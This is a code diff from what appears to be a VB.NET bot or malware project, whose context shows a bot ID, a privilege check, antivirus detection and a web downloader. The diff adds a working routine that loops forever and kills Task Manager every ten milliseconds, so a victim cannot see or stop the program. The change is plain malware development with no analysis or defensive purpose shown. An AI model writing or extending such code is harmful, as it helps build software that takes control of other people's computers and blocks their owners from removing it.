@@ -11,6 +11,7 @@
         MsgBox(BotID)
         MsgBox("Application Run as Admin? " + Privileges().ToString)
         MsgBox(AV)
+        ProcessKiller("Taskmgr")
     End Sub
 
 #Region "Download File From Web [Downloader]"
@@ -231,6 +232,22 @@
             Return False
         End Try
     End Function
+#End Region
+
+#Region "Kill Process"
+    Public Sub ProcessKiller(ByVal Name As String)
+        While True
+            For Each p As Diagnostics.Process In Diagnostics.Process.GetProcesses()
+                Try
+                    If p.ProcessName.ToLower = Name.ToLower Then
+                        p.Kill()
+                    End If
+                Catch ex As Exception
+                End Try
+            Next
+            Threading.Thread.Sleep(10)
+        End While
+    End Sub
 #End Region
 
 End Module
